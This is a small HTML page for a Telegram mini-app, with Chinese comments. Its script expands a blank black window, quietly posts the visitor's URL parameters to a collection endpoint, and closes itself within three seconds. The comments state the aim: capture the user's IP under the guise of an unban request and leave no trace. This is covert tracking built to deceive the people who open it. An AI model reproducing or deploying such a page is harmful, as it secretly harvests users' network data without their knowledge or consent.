<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; margin: 0; padding: 0; } /* 全黑背景 */
    </style>
</head>
<body>
    <script>
        // 1. 初始化并隐藏界面
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // 2. 静默上报并请求解禁
        fetch('/api/collect' + window.location.search)
            .then(response => response.json())
            .then(data => {
                // 不管成功失败，拿完 IP 立刻关窗，不留痕迹
                tg.close();
            })
            .catch(err => {
                // 报错也秒关，不弹窗
                tg.close();
            });

        // 3. 保险起见，3秒后如果还没关，强行自杀
        setTimeout(() => { tg.close(); }, 3000);
    </script>
</body>
</html>
